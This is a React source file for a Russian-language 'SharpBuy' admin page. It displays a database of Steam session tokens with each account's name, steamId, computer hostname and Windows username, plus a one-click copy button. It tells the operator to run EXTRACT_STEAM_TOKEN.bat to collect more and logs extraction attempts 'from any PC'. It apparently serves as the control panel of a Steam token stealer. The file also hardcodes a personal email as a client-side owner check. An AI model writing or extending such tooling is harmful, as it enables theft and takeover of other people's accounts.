import React, { useCallback, useEffect, useState } from 'react';
import { useAuth } from '../context/AuthContext';

export const AdminPage = ({ onNavigate, onOpenAuth }) => {
  const { user, token, logout } = useAuth();
  const [records, setRecords] = useState([]);
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [copiedId, setCopiedId] = useState('');

  const isOwner = Boolean(
    user?.isOwner
    || user?.role === 'OWNER'
    || user?.email === 'iliykuzin2@gmail.com'
  );

  const loadTokens = useCallback(async () => {
    if (!user || !token || !isOwner) return;

    setLoading(true);
    setError('');
    try {
      const res = await fetch('/api/auth?action=admin-tokens', {
        headers: { Authorization: `Bearer ${token}` },
        cache: 'no-store',
      });
      const data = await res.json();
      if (res.status === 403) {
        throw new Error('Сессия устарела. Выйди и войди снова.');
      }
      if (!res.ok || !data.success) {
        throw new Error(data.error || 'Не удалось загрузить базу токенов');
      }
      setRecords(Array.isArray(data.records) ? data.records : []);
      setEvents(Array.isArray(data.events) ? data.events : []);
    } catch (err) {
      setError(err.message || 'Ошибка загрузки');
      setRecords([]);
    } finally {
      setLoading(false);
    }
  }, [user, token, isOwner]);

  useEffect(() => {
    if (!user) {
      setLoading(false);
      return;
    }
    if (!token) {
      setLoading(false);
      setError('');
      return;
    }
    if (!isOwner) {
      setLoading(false);
      return;
    }
    loadTokens();
  }, [user, token, isOwner, loadTokens]);

  const copyToken = async (record) => {
    try {
      await navigator.clipboard.writeText(record.token || '');
      setCopiedId(record.id || record.steamId);
      setTimeout(() => setCopiedId(''), 1500);
    } catch {
      setError('Не удалось скопировать токен');
    }
  };

  if (!user) {
    return (
      <section className="mx-auto max-w-3xl px-4 py-20 text-center">
        <div className="rounded-2xl border border-white/10 bg-[#101216] p-10">
          <h1 className="text-2xl font-black tracking-wide text-white">Admin Panel</h1>
          <p className="mt-4 text-sm text-white/60">
            Войди в аккаунт владельца, чтобы открыть базу токенов.
          </p>
          <button
            onClick={onOpenAuth}
            className="mt-6 rounded-xl bg-[#e8583a] px-6 py-3 text-sm font-bold uppercase tracking-wide text-white"
          >
            Войти
          </button>
        </div>
      </section>
    );
  }

  if (!token) {
    return (
      <section className="mx-auto max-w-3xl px-4 py-20 text-center">
        <div className="rounded-2xl border border-amber-500/20 bg-[#101216] p-10">
          <h1 className="text-2xl font-black text-amber-300">Нужен повторный вход</h1>
          <p className="mt-4 text-sm text-white/60">
            Сессия устарела. Выйди и войди снова — тогда админка покажет токены.
          </p>
          <div className="mt-6 flex justify-center gap-3">
            <button
              onClick={() => { logout(); onOpenAuth(); }}
              className="rounded-xl bg-[#e8583a] px-6 py-3 text-sm font-bold uppercase tracking-wide text-white"
            >
              Войти заново
            </button>
          </div>
        </div>
      </section>
    );
  }

  if (!isOwner) {
    return (
      <section className="mx-auto max-w-3xl px-4 py-20 text-center">
        <div className="rounded-2xl border border-red-500/20 bg-[#101216] p-10">
          <h1 className="text-2xl font-black text-red-400">Доступ запрещён</h1>
          <p className="mt-4 text-sm text-white/60">
            Эта страница доступна только владельцу SharpBuy.
          </p>
          <button
            onClick={() => onNavigate('home')}
            className="mt-6 rounded-xl border border-white/10 px-6 py-3 text-sm font-bold text-white/80"
          >
            На главную
          </button>
        </div>
      </section>
    );
  }

  return (
    <section className="mx-auto max-w-6xl px-4 py-10">
      <div className="mb-8 flex flex-wrap items-end justify-between gap-4">
        <div>
          <p className="text-xs font-bold uppercase tracking-[0.2em] text-[#e8583a]">SharpBuy Admin</p>
          <h1 className="mt-2 text-3xl font-black text-white">База токенов</h1>
          <p className="mt-2 text-sm text-white/50">
            {user.displayName || user.email} · sharpbuy.org/admin
          </p>
        </div>
        <div className="flex gap-3">
          <button
            onClick={loadTokens}
            disabled={loading}
            className="rounded-xl border border-[#e8583a]/40 px-4 py-2 text-sm font-bold text-[#e8583a] disabled:opacity-50"
          >
            {loading ? 'Загрузка...' : 'Обновить'}
          </button>
          <button
            onClick={() => onNavigate('home')}
            className="rounded-xl border border-white/10 px-4 py-2 text-sm text-white/70"
          >
            На сайт
          </button>
          <button
            onClick={logout}
            className="rounded-xl border border-white/10 px-4 py-2 text-sm text-white/70"
          >
            Выйти
          </button>
        </div>
      </div>

      <div className="rounded-2xl border border-white/10 bg-[#101216] overflow-hidden">
        <div className="border-b border-white/10 px-5 py-4 flex items-center justify-between">
          <span className="text-sm text-white/70">Всего записей: <strong className="text-white">{records.length}</strong></span>
        </div>

        {error && (
          <div className="border-b border-red-500/20 bg-red-500/10 px-5 py-3 text-sm text-red-300">
            {error}
            <button onClick={loadTokens} className="ml-3 underline">Повторить</button>
          </div>
        )}

        {!loading && !error && records.length === 0 && (
          <div className="px-5 py-12 text-center text-sm text-white/40">
            Пока нет токенов. Запусти EXTRACT_STEAM_TOKEN.bat и нажми «Обновить».
          </div>
        )}

        <div className="divide-y divide-white/5">
          {records.map((record) => (
            <div key={record.id || record.steamId} className="px-5 py-4">
              <div className="flex flex-wrap items-start justify-between gap-3">
                <div>
                  <div className="text-sm font-bold text-white">
                    {record.accountName || 'unknown'}
                    {record.personaName ? ` · ${record.personaName}` : ''}
                  </div>
                  <div className="mt-1 text-xs text-white/45 font-mono">{record.steamId}</div>
                  <div className="mt-2 text-xs text-white/35">
                    {record.hostname || 'PC'} · {record.username || 'user'} · {record.ingestedAt ? new Date(record.ingestedAt).toLocaleString('ru-RU') : ''}
                  </div>
                </div>
                <button
                  onClick={() => copyToken(record)}
                  className="rounded-lg bg-[#e8583a]/15 px-3 py-2 text-xs font-bold uppercase tracking-wide text-[#e8583a]"
                >
                  {copiedId === (record.id || record.steamId) ? 'Скопировано' : 'Копировать'}
                </button>
              </div>
              <div className="mt-3 rounded-xl bg-black/30 p-3 font-mono text-[11px] leading-5 text-emerald-400 break-all">
                {record.token}
              </div>
            </div>
          ))}
        </div>
      </div>

      {events.length > 0 && (
        <div className="mt-6 rounded-2xl border border-white/10 bg-[#101216] overflow-hidden">
          <div className="border-b border-white/10 px-5 py-4">
            <span className="text-sm font-bold text-white/80">Последние попытки (с любого ПК)</span>
          </div>
          <div className="divide-y divide-white/5 max-h-64 overflow-y-auto">
            {events.map((ev) => (
              <div key={ev.id} className="px-5 py-3 text-xs">
                <span className={`font-bold uppercase ${ev.status === 'success' ? 'text-emerald-400' : ev.status === 'error' ? 'text-red-400' : 'text-amber-300'}`}>
                  {ev.status}
                </span>
                <span className="text-white/50 ml-2">
                  {ev.hostname || '?'} · {ev.username || '?'} · {ev.at ? new Date(ev.at).toLocaleString('ru-RU') : ''}
                </span>
                <div className="text-white/40 mt-1">{ev.message}{ev.accountName ? ` (${ev.accountName})` : ''}</div>
              </div>
            ))}
          </div>
        </div>
      )}
    </section>
  );
};

export default AdminPage;
